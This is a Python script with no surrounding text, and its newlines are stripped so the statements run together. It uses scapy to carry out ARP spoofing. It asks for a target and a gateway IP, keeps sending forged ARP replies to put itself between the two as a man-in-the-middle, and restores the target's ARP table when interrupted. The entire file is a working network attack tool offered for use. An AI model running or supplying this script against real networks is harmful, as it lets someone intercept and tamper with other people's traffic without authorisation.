import scapy.all as scapyimport timeimport systarget_ip = raw_input("target_ip: ")gateway_ip = raw_input("gateway_ip: ")sent_packets = 0def get_mac(ip):    arp_request = scapy.ARP(pdst=ip)    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")    arp_request_broadcast = broadcast/arp_request    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]    return answered_list[0][1].hwsrcdef spoof(target_ip,spoof_ip):    target_mac = get_mac(target_ip)    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)    scapy.send(packet, verbose=False)def restore(destination_ip, source_ip):    desination_mac = get_mac(destination_ip)    source_mac = get_mac(source_ip)    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=desination_mac, psrc=source_ip, hwsrc=source_mac)    scapy.send(packet, count=4, verbose=False)try:    while True:        spoof(target_ip, gateway_ip)        spoof(gateway_ip, target_ip)        sent_packets = sent_packets + 2        print("\r[+] Number of packets sent = " + str(sent_packets)),        sys.stdout.flush()        time.sleep(2)except KeyboardInterrupt:    print("\n [+] Quit Spoofing")    restore(target_ip, gateway_ip)